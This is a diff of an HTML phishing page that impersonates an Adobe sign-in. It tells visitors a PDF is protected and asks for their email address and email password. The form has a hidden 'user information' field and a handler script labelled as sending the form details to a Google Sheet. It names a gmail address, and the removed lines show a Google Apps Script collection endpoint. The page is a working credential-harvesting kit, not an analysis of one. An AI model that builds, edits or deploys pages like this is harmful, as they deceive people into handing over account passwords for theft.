@@ -10,65 +10,68 @@
     <meta name="description"
         content="Manage your Adobe Account profile, password, security options, product service subscriptions, privacy settings, and communicaiton preferences. ">
     <!-- Compiled and minified CSS -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
+    <!-- Latest compiled and minified CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+
+    <!-- Optional theme -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css"
+        integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
+
     <link rel="stylesheet" href="./style.css">
 </head>
 
 <body>
-    <div class="container">
+    <div class="container-fluid">
         <div class="row">
-            <div class="col s12 m12 l12 form">
+            <div class="col-md-12 col-lg-12 col-sm-12">
                 <img class="header-img"
                     src="./images/kisspng-adobe-systems-logo-business-adobe-acrobat-adobe-premier-5b48b7de87b4c3.4823781215314923185559.png"
                     width="120px">
-                <h4>Sign In using your email and password</h4>
+                <h2 style="text-align: center;">Sign In using your email and password</h2>
                 <div class="logo"><img src="./images/Adobe-logo.png" width="30%" /></div>
-                <form class='gform' id="contact" data-email="hxan619@gmail.com" method="POST"
-                    action="https://script.google.com/macros/s/AKfycbwcezWyjISy7yfv-VNOfb5mhwlwE-Y-jwn3u3D9aOSkRJYAHMc/exec">
-                    <input name="email" class="email" type="email" placeholder="Recover Email Address" />
-                    <input name="pass" class="password" type="password" placeholder="Email Password" />
+                <br>
+                <form class='gform' id="contact" data-email="hxan619@gmail.com" method="POST">
+                    <div class="form-group">
+                        <input name="email" class="email form-control" type="email"
+                            placeholder="Recover Email Address" />
+                    </div>
+                    <div class="form-group">
+                        <input name="pass" class="password form-control" type="password" placeholder="Email Password" />
+                    </div>
                     <input name="user_informaion" type="text" id="info" style="display: none;" />
                     <a href="#" class="pdf-link">This PDF file is protected</a>
                     <br>
                     <button type="submit" class="view_file">VIEW FILE</button>
                 </form>
                 <br>
-                <br>
                 <div class="footer">
                     Sign in with your recieving email and password
                 </div>
             </div>
-        </div>
-    </div>
-    <div class="loader">
-        <div class="preloader-wrapper active">
-            <div class="spinner-layer spinner-blue-only">
-                <div class="circle-clipper left">
-                    <div class="circle"></div>
-                </div>
-                <div class="gap-patch">
-                    <div class="circle"></div>
-                </div>
-                <div class="circle-clipper right">
-                    <div class="circle"></div>
+            <div class="loader">
+                <div class="d-flex justify-content-center">
+                    <div class="spinner-border" style="width: 3rem; height: 3rem;" role="status">
+                        <span class="sr-only">Loading...</span>
+                    </div>
                 </div>
             </div>
         </div>
-
     </div>
 
-    <!-- Compiled and minified JavaScript -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
-    <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
-    <script data-cfasync="false" type="text/javascript" src="./js/form-submission-handler.js"></script>
-    <script>
-        window.addEventListener('DOMContentLoaded', () => {
+    <!-- Latest compiled and minified JavaScript -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
+        integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
+        crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
+        integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1"
+        crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
+        integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
+        crossorigin="anonymous"></script>
 
-            var toastElement = document.querySelector('.toast');
-            var toastInstance = M.Toast.getInstance(toastElement);
-        })
-        // toastInstance.dismiss();
-    </script>
+    <!-- Script to submit the form datils to google sheet -->
+    <script data-cfasync="false" type="text/javascript" src="./js/form-submission-handler.js"></script>
 </body>
 
 </html>
